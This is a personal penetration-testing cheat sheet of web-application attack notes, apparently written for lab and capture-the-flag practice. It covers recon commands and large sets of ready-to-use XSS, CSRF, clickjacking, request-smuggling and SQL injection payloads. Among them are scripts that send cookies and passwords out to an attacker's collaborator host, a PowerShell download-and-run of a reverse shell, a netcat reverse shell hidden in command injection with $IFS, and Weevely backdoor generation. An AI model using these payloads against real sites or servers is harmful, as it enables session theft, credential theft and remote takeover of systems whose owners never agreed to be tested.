# WebApp Enum
## Refs
https://github.com/coreb1t/awesome-pentest-cheat-sheets  
https://www.note4tech.com/post/sql-injection-tutorial-login-bypass  
https://exploitedbunker.com/articles/pentest-cheatsheet/

# Cheat Sheet
- Did you run `Exploit suggester` and other scripts ?
- Did you check the `sudo` version ?
- Create a graphical sitemap to represent everything properly. Use zap spider to have a rough sitemap to work with.
- Use `nmap` to discover new services... Did you try to scan `UDP` ? 
	https://www.stationx.net/nmap-cheat-sheet/  
	https://kirelos.com/nmap-scan-specific-udp-port/

		sudo nmap 10.13.37.11 --top-ports 10 -sU -sCV -Pn
		sudo nmap 10.13.37.11 --script "http*"
		sudo nmap 10.13.37.11 --script "snmp* and not snmp-brute"

- Check the header's request. What's the agent request ? Is it `curl` ? If yes, you should try to inject some commands. (see doctor video from ippsec)
	- Example:
			http://10.10.10.10/$(whoami)

	We can also try `braces expansion`
			http://10.10.10.10/$(`{echo,test}`)

	Or use the `$IFS` variable
			http://10.10.10.10/$(`echo$IFS'test'`)
			http://10.10.10.10/`echo$IFS"test"`

- Did you enum every directories ? 
	- Did you try different worldlist ? (in raft, `dir` vs `words` are an important distinction)
	- Use `raft` but also `web-content/common.txt` and `web-content/big.txt`
- Did you try to enum subdomains ?
	- Maybe use `cewl` to generate a custom domain list to add to seclist lists. Remember the `tenet` machine on HTB.
- With SQLMap, don't forget to use the `level` param to get more depth in the attack !!!
- Look at the respone header and check the `charset` param. If this is `utf-8` try to tamper `sqlmap` request with the tamper script `charunicodeescape`.
- If you have an SQLi, can you modify the DB by changing a password or adding a new user ?
- If you have an SQLi, try to read files with `--file-read` param 
- If you have an SQLi, can you have a shell with `-os-shell` param ?
- Login page
	- Try to put special chars inside the username to see if the application is going to error or not. 
	- If it works, try to put a `*` to bypass the login page.
	- https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/

# RECON (MANUAL)
## WHOIS
Provides relevant information about the website, the owner etc...
[whois.domaintools.com](http://whois.domaintools.com)

## NETCRAFT
[netcraft.com](http://netcarft.com)
Discovering technologies used by webapp. Apache, Google CDN, PHP, SSL, jQuery, CMS etc...
## DNS/VHOSTS
Get information about web servers , vhosts etc...
[robtex.com](http://robtex.com)

## SSL
Check the certificate issuer to get a usesrname or email.

# RECON (AUTOMATIC)
## Collect data about anything with MALTEGO
https://www.maltego.com/  

Collect info about anything... Person, website etc...

## Virtual Host Discovery using FFUF

1. Check the response length of false positive.

		curl -s -H "Host: nonexistent.example.com" http://example.com | wc -c

2. Start `FFUF` and filter out the response length.

		ffuf -c -w /path/to/wordlist -u http://example.com -H "Host: FUZZ.example.com" -fs <Response length>

## Nmap
https://medium.com/@iphelix/nmap-scanning-tips-and-tricks-5b4a3d2151b3
https://kirelos.com/nmap-scan-specific-udp-port/  
https://www.stationx.net/nmap-cheat-sheet/  

### Standard command

	nmap -sC -sV -oN path/to/file ip addr

### Use a different script

	nmap --script "nfs-ls" 192.168.1.10
	nmap --script "http*" 192.168.1.10
	nmap --script "snmp* and not snmp-brute" 192.168.1.10

### If host doesn't respond to ping, we can tel nmap it's up by puting the flag -Pn

	sudo nmap -sC -sS blue -Pn

### Scan for CVE

[Ref](https://medium.com/@alexander.tyutin/continuous-vulnerability-scanning-with-nmap-ea8821d587b0)

	sudo nmap -sV --script=vulners --script-args mincvss=7.0 -p135,139,445,3389,49152,49153,49158,49159,49160 blue -T5

### Scan for UDP
https://kirelos.com/nmap-scan-specific-udp-port/

	sudo nmap -sU --top-ports 10
	sudo nmap -sU --top-ports 10 -sC -sV

### Scan for vulnerabilities

	sudo nmap -sV --script=vuln -p135,139,445,3389,49152,49153,49158,49159,49160 blue -T5

### Scan for smb shares

	sudo nmap -p 445 --script "smb-enum-shares.nse,smb-enum-users.nse" 10.10.222.105

### Enumerate port 111 nfs shares

	nmap -p 111 --script "nfs-ls,nfs-statfs,nfs-showmount" 10.10.222.105

## Brute Force directories with GoBuster

	gobuster dir -u *url *-w *passwordList.txt *

## Getting keywords from web pages with CEWL

	sudo cewl -w wordlist.txt. -d 10 -m 1 http://10.10.10.193

# Types of Ciphers
https://www.hacker101.com/playlists/cryptography  

There are two types of cyphers

## Symmetric

- Stream
	- Encrypts data byte-by-byte
	- Ex: RC4 (SSL)
		- The basic construction is enssentially a random number generator seeded with you key, which generates bytes that are XORed with each type of plaintext for encryption.
		- Decryption is symply XORing the ciphertext instead. This means that both operations are identical.
- Block
	- Encrypts data block-by-block
	- Ex: AES, DES, 3DES, Twofish
		- In a block cipher, you split you data into N-byte blocks and encrypt those separately. Because we can't assume that all data is a multiple of N-bytes long, we have to pad, data, introducing complexity. 
		- In addition, the encryption and decryption processes are not the same. 

## Assimetric

- Each side has their own private key and exchange public keys
- Generally, assymmetric ciphers are not used for encrypting data directly due to performance concerns and complexity. Rather, you use them to securely transmit a symmetric key.
- If Alice wants to send a secure message to Bob, she can encrypt the message with a symmetric key, encrypt that key with Bob's public key, and then send the ciphertext and encrypted key to Bob. He then decrypts the key with his private key and uses that to decrypt the message.

# Bypass 4xx
https://github.com/lobuhi/byp4xx  

To scan a url, use `byp4xx.sh`. See the link below.

# PKCS
The most common padding system you'll see in use is PKCS#7, and it's extraordinary simple.
If you need a byte of padding, it's a single 01 byte.

If you need two bytes of padding, it's two 02 bytes. Etc...

Ex:
- daeken => daeken\x02\x02
- hacker101 => hacker101\x07\x07\x07\x07\x07\x07\x07

# WEBSHELL/REVERSE SHELL
https://www.hackingarticles.in/web-shells-penetration-testing/  

## WEEVELY
Weevely is a stealthy PHP internet shell which simulates the link to Telnet and is designed for remote server administration and penetration testing. It can be used as a stealth backdoor a web shell to manage legit web accounts, it is an essential tool for web application post-exploitation. We can generate a PHP backdoor protected with the password.

Generate a webshell  

	weevely generate <password> <file-name>

Communicate with the uploaded webshell  

	weevely <url/to/webshell> <password>

# Cookies

Cookies works with domains and subdomains. If a cookie is set for the root domain, then it's gonna be accessible from the subdomains too. 

Common cookies flag: 
 - **Secure**: Means the cookie will only be accessible from `HTTPS`
 - **HTTOnly**: The cookie cannot be read by Javascript

# MIME Sniffing

The browser will often not just look at the `Content-Type` header that the server is passing, but also the contents of the page. If it looks enough like `HTML`, it'll be parsed as `HTML`.

For example, if I upload an image and that image contains enough `HTML` tags, these tags could be interpret by webpage, which could lead to link an image to another user profile etc...
That is reason why websites like `facebook` uses a different subdomain to upload files.

Also if I can control the encoding type, I can control the way the code is interpret by the server. Example: UTF-7 to UTF-8.

MIME type needs to be set all the time.

# SOP

`Same Origin Policy` (SOP) is how the browser restricts a number of security-critical features:

- What domains you can contact via `XMLHttpRequest`
- Access to the DOM accross separate frames/windows

# XSS
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-tag-blacklist  
https://tryhackme.com/room/xss  
https://netsec.expert/posts/xss-in-2021/?utm_source=newsletter&utm_medium=email&utm_campaign=bug_bytes_109_hacking_big_tech_companies_with_dependency_confusion_using_crypto_to_forge_jwts_xss_that_works_in_2021&utm_term=2021-02-10

## Stored XSS
Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.

![ref](https://i.imgur.com/LCSFUTB.png)

## Reflected XSS
In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarize, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.

This might seem harmless as it requires the victim to send a request containing an attackers payload, and a user wouldn't attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email.

Reflected XSS is the most common type of XSS attack.

![ref](https://i.imgur.com/yX7zRh8.png)

## DOM-Based XSS
This is when the vulnerability exists in client-side code rather than server-side code.
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML.

- Example of payloads:

		href="javascript:alert(1)"

## Dangling markup injection
https://portswigger.net/web-security/cross-site-scripting/dangling-markup

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

- Vulnerable code
		<input type="text" name="input" value="CONTROLLABLE DATA HERE

- Payload
		"><img src='//attacker-website.com?

## XSS Detection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-tag-blacklist
https://medium.com/@jonathanbouman/reflected-xss-at-fotoservice-hema-nl-af344ef63433

- First, identify where the input/url is reflected in the page. For example, if you have a search box and you try to search some keywords, what happens in the html code of the page. Can you find your keywords inside a `quoted attribute` or inside an `href` attribute ?

	- Search keyword `zzz`
	- Response from the server

	```
	<form action=/ method=GET>
	    <input type=text placeholder='Search the blog...' name=search value="zzz">
	    <button type=submit class=button>Search</button>
	</form>
	```

	- Payload to inject in a similar case

			"onmouseover="alert(1)

- Check the javascript code and look for `DOM` manipulation. It could be potentialy a `DOM-Based XSS`.
	- Example:

			var search = document.getElementById('search').value;

- Is there any javascript framework active on the page (AngularJS etc...) ?

	- If yes, try to inject a payload like this

			{{$on.constructor('alert(1)')()}}

- Try identify if we have an XSS vuln by injecting some tags inside an html input.

		<script>alert(1)</script>
		<img src=x onerror=alert('XSS');>

- Is there any kind of `canonical link tag` ?  
	https://portswigger.net/research/xss-in-hidden-input-fields

	- If yes, try to inject a payload in the url to link an access key to an event.

			https://ac3f1fe81f703ff580e63fcc00bc00a9.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

- Is there any `event listener` on the page ? Can we interact with it ? 

- Then we have to identify which kind of protection/filtering have been set up on the server.

- We should also check the cookies with the browser (storage tab) to define which type of payload we're gonna use.

	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection  

	- If http only is set to false, then we can use a payload to extract the administrator password by requesting the document cookie.

	![image.png](../_resources/9c88dbda66faaef88069f3f4e4074ebd.png)

	According to the [Microsoft Developer Network](http://msdn2.microsoft.com/en-us/library/ms533046.aspx), HttpOnly is an *additional flag* included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it).
	https://owasp.org/www-community/HttpOnly  


***
## Bypass filters with Encoding techniques
If the payload doesn't work right away, check the html code and see what happens. Then we can try encoding with **btoa** (base64) or different bypass filters

https://owasp.org/www-community/xss-filter-evasion-cheatsheet  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-tag-blacklist  

- Bypass quote filters ('")

	- Bypass quotes filters using charcode

			<sCriPt>alert(String.fromCharCode(108,97,108,97))</scRipT>

			<><>

			<script>new Image().src="http://localhost/cookie.php?c="+btoa(document.cookie);</script>

	- Url encoding version

			<script>new Image().src="http://10.10.14.10/cookie.php?c="%2bdocument.cookie;</script>

## Invoke a remote shell from an ajax POST request

See Nishang : https://github.com/samratashok/nishang
See cheat sheet here : https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

	var http = new XMLHttpRequest();
	var url = "http://localhost/admin/backdoorchecker.php";

	var params = 'cmd=dir | powershell.exe -exec bypass -C "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.16/nishang-shell-5000.ps1\')"';

	http.open("POST", url);
	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	http.withCredentials = true;
	http.send(params);

## Bypass tags filtering
https://medium.com/@ratiros01/tryhackme-cross-site-scripting-140773f9e022  
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet  

- We need to identify the tag are being filtered by the server. Hence we should use `zaproxy` to Fuzz the `tag` that we want to bypass using a payload like this:

		http://example.com/comment=<FUZZ>

- We can use the tags wordlist in `toolbox` or go directly on the portswigger [website](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and copy the tags list into the clipboard.

### Bypassing with the `body` tag
- Once we know what tags are filtered, then we can try to identify the events that are filtered by the server. For example, if the `body` tag is not filtered, we can try to generate a payload like this:

		http://example.com/comment=<body FUZZ=1>

- Again, we can use the events wordlist in `toolbox` or we can go directly on the portswigger [website](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and copy the events list into the clipboard.

- Here is an example of fully crafted `xss` payload:

		http://example.com/comment=<body onresize=alert(document.cookie)>

- We can then send the payload to the victim and successfully triggered a `reflected XSS` attack!
- Another way is to store the payload in an `iframe` html tag.

		<iframe src="http://example.com/comment=<body onresize=alert(document.cookie)>"

### Bypassing with a `custom` tag

- If `custom` tags are not filtered, then we can generate a payload and brute force every events with `zaproxy`.

		http://example.com/id=<mytag FUZZ=1>

- Then we generate a payload with the valid event.

		http://example.com/id=<mytag id=x onfocus=alert(document.cookie) tabindex=1>#x

		\\ This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

- We can then store the injection inside a web page>

		<script>location='http://example.com/id=<mytag id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>

### Bypassing with `svg` tag

- In that case, the `svg` and `animatetransform` tag are allowed.
- That we scaned for events that could be allowed and we've found that `onbegin` is allow.

		<svg><animatetransform event=1>

- The final payload looks like this

		<svg><animatetransform onbegin=alert(1)>

### Bypassing with the `img` tag

		<img src=1 onerror=alert(1)>

## Bypass `Events` and `anchors` filtering

- In a case where `svg` tag would be allowed, then we can have a payload like this:

		<svg> <a> <animate attributeName=href values=javascript:alert(1) /> <text x=20 y=20>Click me</text> </a>

## Bypass words filtering

	<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))";>
	0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
	<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
	<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))"></xss>

## Bypass `angle brackets` and `single quotes` and `backslash` escaped

		http://foo?&apos;-alert(1)-&apos;

## Bypass charachters blocked in URL

		http://example.com/postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

- Break down

	```
	postId=5&
		'},
			x=
				x=>{
					throw/**/onerror=alert,1337
				},
				toString=x,window '',
		{x:'
	```

- The exploit uses exception handling to call the alert function with arguments.
- The throw statement is used, separated with a blank comment in order to get round the no spaces restriction.
- The alert function is assigned to the onerror exception handler.
- As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used.
- We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window.

## Escaping Angluar JS sandbox without strings

		http://example.com/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

- Break down

	```
	search=1
		&toString().constructor.prototype.charAt%3d[].join;
		[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
	```

- The exploit uses toString() to create a string without using quotes.
- It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
- Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property.
- Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.

## Escaping `src` html attribute

Let's say, the page insert an `src` attribute using the input supplied by the user.
We can break out the `src` attribute by injecting a payload like this:

		" onload="alert(1)"

## Escaping javascript strings (DOM-Based XSS)

- If we have an input is reflected inside a javascript code:
```
	<script>
		var searchTerms = 'VULNERABLE VALUE';
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
	</script>
```

- then we can try to escape javascript with a payload like this:

		</script><script>alert(1)</script>

		OR

		f\'+alert(1) \\
	
		OR

		f'+alert(1)+'

## Escaping javascript JSON ojbect

- Let's say an object is construct with `eval` function:

		Responde text:
		{"searchTerm":"\\"alert(1)\\","results":[]}

		Javascript command:
		eval('var searchResultsObj = ' + this.responseText);

- We can inject a payload like this:

		\"-alert(1)}\\

## Bypass javascript `replace` function as xss protection

- If we have a code like this:

	```
	function escapeHTML(html) {
		return html.replace('<', '&lt;').replace('>', '&gt;');
	}
	```

- Then we can bypass the protection by putting `<>` before the payload. The reason is that the `replace` functionn only replace the first occurence if the argument is a string.

	```
	<><img src=1 onerror=alert(1)>
	```

## XSS from `event listener`
If there is a listener on the page, we can create a web page and put an `iframe` in it with an xss payload.

	<iframe src="https://ac091f701f05d96b80b84d0600b400a5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">

	<iframe src="https://ac0b1ffd1f1a90f780e1174c00210000.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">

	<iframe src="https://ace91f0b1f1e90a980341c9f0024003a.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>

## GETTING RCE / SHELL FROM XSS
https://www.youtube.com/watch?v=2BvuoWG_r9Y  

- Try to include some external links inside an html tag  

		<img src=http://10.10.14.10/test.jpg />

- Try to include some malicious code inside the url  

		curl http://10.10.14.xx/$(whoami)
		curl http://10.10.14.xx/$(ping$IFS-c$IFS1$IFS10.10.14.10)
		curl http://10.10.14.10/$(nc.traditional$IFS-e/bin/sh$IFS'10.10.14.10'$IFS'2222')

- The same can be done without curl  

		<img src=http://10.10.14.10/$(nc.traditional$IFS-e/bin/sh$IFS'10.10.14.10'$IFS'2222') />

## Send a cookie from an `xss` vulnerability

```
<script>
	fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
		method: 'POST',
		mode: 'no-cors',
		body:document.cookie
	});
</script>
```

## Send a password from an xss vulnerability

```
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
	method:'POST',
	mode: 'no-cors',
	body:username.value+':'+this.value
});">
```

## From XSS to CSRF by forcing user to change his email on a website

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	var changeReq = new XMLHttpRequest();
	changeReq.open('post', '/email/change-email', true);
	changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

# CSRF
https://security.stackexchange.com/questions/138987/difference-between-xss-and-csrf  

Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as

		<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> 

which would change the account email on the vulnerable website to "pwned@evil-user.net".  CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.

Once again, there is a nice automated scanner, which tests if a site is vulnerable to CSRF. this tool is known as `xsrfprobe` and can be install via pip using:

		pip3 install xsrfprobe.

- The syntax for the command is

		xsrfprobe -u <url>/<endpoint>. Let's run this against our vulnerable site.

## CSRF Detection
- Check the headers (request/response)
- Look for cookies, token, referal fields etc...
- Try to remove them and see how it changes the response from the server.
- Is the `csrf` token duplicated between the cookie and the header ? 

## CSRF Payloads
### Payload template
Create a web page and store that paylod inside of it. Every user visiting the page will execute the form and make the request to the page provided by the `action` param.

```
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>
```

### Bypass CSRF token

- Try to change the method from `POST` to `GET` and see if the server accept the request. 
- Try to remove the `CSRF` param from the request and see if the server accept the request.
- Sometime, the `CSRF` token is not tied to the user session. So, we can try these steps:
	- Create 2 accounts
	- With the first one, make a request to change the email address and capture it with `zaproxy`.
	- Grab the `CSRF` token and drop the request.
	- Connect with the other account (incognito mode)
	- Make a request to change the email and capture it with `xaproxy`.
	- Swap the value of the `CSRF` param with the one that we grabbed in the first request.
	- Release the request.

### Bypass CSRF Token and Cookie protection

- Try to modify or remove the token and observe how the website responds.
- Try to modify the cookie (key/token) in the request and observe how the website responds.
- Try to modify the session value and observe how the website responds.

- If the cookie and token modifications make the request fail but they do not eject you from the session, then it means that they are not linked to the user session. Which means that we can create a payload with a hidden value for the token. But we don't have access to the cookie from  the form, so we need to find another way to modify the cookie (key/token) value. For example, it could a vulnerable search form on the target website. If the website set a cookie in an unsafe way (like a search form etc...), then we can try inject a `set-cookie` value to modify the user cookie.

- Then we can force the user to make a request with a payload like this:

		/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key

- Finaly, we can create a web page and put the payload inside of it:

```
<form method="$method" action="$url">
	<input type="hidden" name="email" value="evil@example.com">
	<input type="hidden" name="csrf" value="xUVdEulFR7CiTdonWCr3AbRzkcjDyWQK">
</form>
<img src="/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
```

### Bypass CSRF when token is duplicated in cookie

When a token is duplicated inside a cookie, we have to create a payload with the same cookie and same token. The only way to set a cookie value, is by injecting a `set-cookie` command via an input from the website. So we need to find an input who already set a cookie value natively. It could be a search filed or something similar.

- Here is an example of payload:

```
<form method="POST" action="https://acd61ff21f7a51b68077fd1800fa0010.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="evil@example.com">
     <input type="hidden" name="csrf" value="fake">
</form>
<img src="/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();" />
```

### Bypass when a Header field has to be present

- Let's say, we have a `referal` header field and if we modify it, the request fail but if we remove completely, the request goes through !

	The payload would be like this:

	```
	<form method="POST" action=" https://acac1f1f1f1ae839805c120100f000a3.web-security-academy.net/email/change-email">
	    <input type="hidden" name="email" value="evil@example.com">
	<meta name="referrer" content="no-referrer">
	</form>

	<script>
	      document.forms[0].submit();
	</script>
	```

- If the header has to be present, then we can use javascript to modify the header of the request.

	```
	<form method="POST" action=" https://acd21ffb1e71273381e62a0400d8008e.web-security-academy.net/email/change-email">
	    <input type="hidden" name="email" value="evil@example.com">
	</form>

	<script>
	      history.pushState("", "", "/?https://acd21ffb1e71273381e62a0400d8008e.web-security-academy.net");
	      document.forms[0].submit();
	</script>
	```

# Clickjacking
Clickjacking is an attack in which a user is tricked to click on something that he didn’t intend to, meaning an attacker could possibly make any actions that a user can do on the webapp just like CSRF. But clickjacking requires user interaction to do a following task whereas CSRF requires no interaction as it can be triggered automatically using javascript.

## Clickjacking detection
https://clickjacker.io/test?url=%5C
https://www.fortinet.com/resources/cyberglossary/clickjacking

- Inspect the response headers.
- Is there any `CSP` (content security policy) ?
- Try to `iframe` the website in a webpage.

### Bypassing `CSRF` token protection.

- Create a web page and include an `iframe` pointing to the target website. 
- Create a button and align it with the iframe.
- Make the iframe transparent with `css`.

When the user will click on the button, it will trigger the button inside the `iframe`.

- Example of payload:
	```
	<style>
	   iframe {
	       position:relative;
	       width: 500px;
	       height: 700px;
	       opacity: 0;
	       z-index: 2;
	   }
	   div {
	       position:absolute;
	       top:$top_value;
	       left:$side_value;
	       z-index: 1;
	   }
	</style>
	```

	```
	<div>Test me</div>
	<iframe src="$url"></iframe>
	```

- Another payload but with the url param already filled

	```
	<style>
	   iframe {
	       position:relative;
	       width: 500px;
	       height: 700px;
	       opacity: 0;
	       z-index: 2;
	   }
	   div {
	position: absolute;
	    top: 456px;
	    left: 44px;
	    z-index: 1;
	    background: green;
	    color: white;
	    border-radius: 20px;
	    padding: 0.45em 2.2em;
	}
	}
	</style>
	```

	```
	<div>Click me</div>
	<iframe src="https://ac5b1f2a1ed452ce80681d4c00a30035.web-security-academy.net/email?email=evil@address.com"></iframe>
	```

### Bypassing the `framebuster`.
A framekiller, also known as a framebuster or framebreaker, is similar to the X-Frame Option and is a piece of JavaScript code that prevents elements of a webpage from being loaded into and displayed in a frame. The JavaScript code validates whether the current window is the main window. If it is not the main window, the page is blocked from being displayed.

- If the frame is blocked by a `framebuster` policy, then we can try to add the `sandbox` param to the iframe.

	```
	<div>Click me</div>
	<iframe src="https://aca91fbd1fac8e7e804b5daa0051000d.web-security-academy.net/email?email=evil@address.com" sandbox="allow-forms"></iframe>
	```

### Chaining `clickjacking` with `XSS`

```
<div>Click me</div>
<iframe
src="https://ace51f8c1eab4d0c805c648900f500ce.web-security-academy.net/feedback/?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

# HTTP Request Smuggling
https://portswigger.net/web-security/request-smuggling
## Intro to HTTP Request Smuggling
Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers.

![smuggling001](https://portswigger.net/web-security/images/http-request-smuggling.svg)

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

![smuggling002](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)

Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results.

## Two ways to specify requests boundaries
Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the `Content-Length `header and the `Transfer-Encoding `header.

- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:

		POST /search HTTP/1.1
		Host: normal-website.com
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 11

		q=smuggling

- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

		POST /search HTTP/1.1
		Host: normal-website.com
		Content-Type: application/x-www-form-urlencoded
		Transfer-Encoding: chunked

		b
		q=smuggling
		0

**It is possible for a single message to use both methods at once, such that they conflict with each other.**

The HTTP specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:

- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

## HTTP Smuggling Attack

Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### CL.TE

	POST / HTTP/1.1
	Host: vulnerable-website.com
	Content-Length: 13
	Transfer-Encoding: chunked

	0

	SMUGGLED

The first server uses the `content-length` header of `13`, and the second server uses the `transfer-encoding` header so it it will place boundary at `0`. This way the second server will start the next request by `SMUGGLED`.

### TE.CL

	POST / HTTP/1.1
	Host: vulnerable-website.com
	Content-Length: 3
	Transfer-Encoding: chunked

	8
	SMUGGLED
	0

The first server uses the `transfer-encoding` header. The second server will use the `content-length` of 3 and will place the boundary at `8` in the request. Then it will start the next request at `SMUGGLED`.

### TE.TE

Both servers use the `transfer-encoding` method so it has to be obfuscated to one of these server.

	Transfer-Encoding: xchunked

	Transfer-Encoding : chunked

	Transfer-Encoding: chunked
	Transfer-Encoding: x

	Transfer-Encoding:[tab]chunked

	[space]Transfer-Encoding: chunked

	X: X[\n]Transfer-Encoding: chunked

	Transfer-Encoding
	: chunked

## HTTP Smuggling Detection
https://github.com/defparam/smuggler

### Automatic Recon
We can use [smuggler](https://github.com/defparam/smuggler) to automaticaly detect `http smuggling` inside webapps.
Here is an [example](https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142) of methodology.

### Manual Recon
https://portswigger.net/web-security/request-smuggling/finding

The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present.

## HTTP Smuggling Exploitation
https://portswigger.net/web-security/request-smuggling/exploiting


# SQL Injection

**https://sqlwiki.netspi.com/attackQueries/lateralMovement/#mysql**

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/  
https://www.asafety.fr/mysql-injection-cheat-sheet/  
https://www.note4tech.com/post/sql-injection-tutorial-login-bypass  
https://github.com/swisskyrepo/PayloadsAllTheThings  
***
Manual enumeration  
https://www.w3schools.com/sql/func_mysql_database.asp  
https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php  
***
MSSQL  
https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/  
***
- Before checking anything, check the header to see if the website is using unicode encoding or something else. If this is the case, we need to convert everything in unicode with cyberchef or zap or a tamper script in sqlmap.  

https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html  

	test' UNION ALL SELECT 58,58,58,DEFAULT_DOMAIN(),58-- gxQm

	\\ Becomes

